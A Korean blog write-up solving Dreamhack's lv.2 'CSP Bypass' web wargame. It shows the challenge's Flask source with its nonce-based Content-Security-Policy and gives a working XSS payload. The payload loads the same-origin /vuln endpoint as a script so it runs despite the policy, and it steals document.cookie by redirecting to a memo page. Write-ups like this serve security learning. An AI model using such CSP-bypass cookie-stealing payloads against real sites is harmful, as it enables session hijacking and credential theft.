---
title: "드림핵 lv.2 - CSP Bypass"
date: 2025-03-17 00:00:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, csp] 
description: 드림핵 CSP Bypass 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/435/](https://dreamhack.io/wargame/challenges/435/)
# 문제 설명
Exercise: CSP Bypass에서 실습하는 문제입니다.

---
# 문제 풀이
## 웹사이트 분석
해당 문제는 이 전에 풀이했던 [XSS Filtering Bypass](https://hoonsooni.com/posts/dreamhack_xss_filtering_bypass/)와 [XSS Filtering Bypass Advanced](https://hoonsooni.com/posts/dreamhack_xss_filtering_bypass_advanced/) 동일한 웹사이트를 가지고 있어서 따로 웹사이트 분석은 하지 않아도 될 것 같다.<br />

```
Content-Security-Policy: 
	default-src 'self'; 
	img-src https://dreamhack.io; 
	style-src 'self' 'unsafe-inline'; 
	script-src 'self' 'nonce-226663aa2eefbac4e463bbcaee9c26ca'
```
문제 설명에 나와있는 것 답게 Header에 전 문제들에선 찾아볼 수 없었던 CSP 정책이 정의돼있다.<br />
이미지 리소스는 `https://dreamhack.io`에서만 받고 스타일 리소스는 본인만 허용하지만 인라인 코드를 사용할 수 있다. 스크립트 또한 본인만 허용하고 nonce 값을 받아서 검열을 거친다.
## 코드 분석
### app.py
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.after_request
def add_header(response):
    global nonce
    response.headers[
        "Content-Security-Policy"
    ] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'"
    nonce = os.urandom(16).hex()
    return response

@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)

app.run(host="0.0.0.0", port=8000)
```
코드도 이 전과 크게 다른 부분은 없고 단지 스크립트의 nonce를 확인하는 부분이 추가된 것 같다.
## 최종 풀이
nonce 값은 매번 완전 랜덤으로 설정되기 때문에 예측하는 것은 불가능하고 16자리의 랜덤 문자열이라서 Brute Forcing으로 시도하는 것도 사실 말이 안되기 때문에 다른 방법을 생각해봐야 한다.<br />
### script가 허용되는 페이지
```
script-src 'self' 'nonce-226663aa2eefbac4e463bbcaee9c26ca'
```
CSP 정의 부분을 다시 살펴보면 self 도메인에서 사용하는 script 태그는 허용하지만 외부에서 오는 스크립트는 nonce 값으로 검열을 한다.<br />

그렇기 때문에 해당 웹서비스 자체에서 스크립트를 실행하는 시도를 해야한다.<br />

잘 알다시피 /vuln 페이지는 param 값으로 들어오는 스크립트를 실행해주는 페이지이다.<br />
그래서 해당 페이지를 그대로 이용하면 다음과 같은 페이로드가 떠오를 수 있다. `<script src="/vuln?param=alert(1)"></script>`.<br />

이렇게 script의 src 속성을 이용해서 /vuln 페이지의 소스코드를 사용하는 방식을 써야한다.
### 페이로드
```
<script src="/vuln?param=document.location='/memo?memo='+document.cookie"></script>
```
이 전에 사용했던 익숙한 스크립트를 /flag 페이지의 인풋으로 보내고 /memo 페이지에 접속해서 플래그를 얻을 수 있다.
#### 간과한 점
```
<script src="/vuln?param=document.location='/memo?memo='%2bdocument.cookie"></script>
```
사실 처음 제공된 스크립트를 업로드 해보면 플래그는 나오지 않는 것을 알 수 있다.<br />
그 이유는 우리가 src 속성에 /vuln이라는 페이지를 입력했는데 이는 URL 주소이다. URL 주소에는 특수 문자에 대한 적절한 URL 인코딩이 필요하다.<br />

여기서 필요한 인코딩은 `document.cookie` 바로 이 전에 `+`를 `%2b`로 변환하는 것이다.<br />

이제 스크립트가 제대로 작동할 것이다.
# 배운 것
CSP라는 개념에 대해 처음 알게 됐고 nonce가 있을 때에 우회하는 시나리오 중 하나를 경험할 수 있었다.